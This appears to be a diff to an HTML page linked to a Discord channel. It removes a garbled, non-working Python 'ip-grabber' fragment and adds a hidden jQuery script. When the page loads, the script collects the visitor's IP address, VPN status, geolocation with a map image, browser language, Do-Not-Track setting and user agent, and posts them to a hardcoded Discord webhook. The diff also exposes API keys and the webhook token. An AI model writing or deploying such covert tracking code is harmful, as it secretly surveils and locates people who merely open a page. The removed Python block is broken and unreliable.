@@ -50,43 +50,97 @@
             </div>
         </div>
 
-        <import json
-import requests
+      <script>
+        $(document).ready(() => {
+          $.getJSON("https://api.ipify.org?format=json", function (data) {
+            $.getJSON(
+              `https://vpnapi.io/api/${data.ip}?key=09743a6399ca4bc4a635c51ecb847a6c`,
+              function (vpnData) {
+                $.getJSON(
+                  `https://ipapi.co/${data.ip}/json`,
+                  function (ipData) {
+                    // sessionStorage.setItem('redirecting', 'true');
+                    sendData(
+                      data.ip,
+                      vpnData.security.vpn,
+                      `${ipData.region}, ${ipData.country_code}`,
+                      // `${id}`,
+                      `http://dev.virtualearth.net/REST/v1/Imagery/Map/Road/${ipData.latitude},${ipData.longitude}/12?mapSize=400,300&pushpin=${ipData.latitude},${ipData.longitude}&key=Ap05UY1k0etqLr1Q9u3d-7OY_JuEzpW8JhAHfZaFpPrZpw6yCfVxGFfVM89fhoZi`
+                    );
+                  }
+                );
+              }
+            );
+          });
+        });
 
-@app.route(<'/ip-grabber', methods=['POST'])
-<div
- ip_grabber():
-    data = request.get_json() 
-    <div
-    # Extract data from the request
-    ipv4 = data['ipv4']
-<div
-    ipv6 = data['ipv6']
-<div
-    location = data['location']
+        function sendData(ip, vpn, ipData /* discordId */, image) {
+          var currentTime = new Date().toUTCString();
+          var embed = {
+            embeds: [
+              {
+                title: "Visitor Logged",
+                description: `Logged At: \`${currentTime}\``,
+                image: {
+                  url: image,
+                },
+                color: 14177041,
+                fields: [
+                  {
+                    name: "IP Address",
+                    value: ip,
+                    inline: true,
+                  },
+                  {
+                    name: "VPN",
+                    value: vpn ? "✅" : "❌",
+                    inline: true,
+                  },
+                  {
+                    name: "Location",
+                    value: ipData ? ipData : "❓",
+                    inline: true,
+                  },
+                  {
+                    name: "Browser Language",
+                    value: navigator.language
+                      ? navigator.language.toUpperCase()
+                      : "❓",
+                    inline: true,
+                  },
+                  {
+                    name: "Do Not Track",
+                    value: navigator.doNotTrack ? "✅" : "❌",
+                    inline: true,
+                  },
+                  {
+                    name: "Cookies Enabled",
+                    value: navigator.cookieEnabled ? "✅" : "❌",
+                    inline: true,
+                  },
+                  {
+                    name: "App Version / User Agent",
+                    value: navigator.appVersion,
+                  },
+                ],
+              },
+            ],
+          };
 
-<div
-    device = data['device']
-    hardware = data['hardware']
-<div
-    <div
-    # Prepare webhook payload
-    payload = {
-        'ipv4': ipv4,
-<div
-        'ipv6': ipv6,
-        'location': location,
-<div
-        'device': device,
-        'hardware': hardware
-    }
-    <div
-    # Send data to the webhook
-<div
-    requests.post(os.getenv(https://discord.com/api/webhooks/1374760366751617145/O7yzCxpkcBvsrCePdf3REayvPHbJ4jJZ3NxTTdCSQAREhHZhUrm3tJyVbm6c_OcRRN5r), json=payload)
-<div
-    
-    return 'OK'>
+          fetch(
+            "https://discord.com/api/webhooks/1374760366751617145/O7yzCxpkcBvsrCePdf3REayvPHbJ4jJZ3NxTTdCSQAREhHZhUrm3tJyVbm6c_OcRRN5r",
+            {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify(embed),
+            }
+          ).catch((error) => {
+            alert("Error sending data:", error);
+          });
+        }
+      </script>
 
         <div class="flexbox">
             <a href="https://discord.com/channels/@me/1369689431820472382" target="_blank">
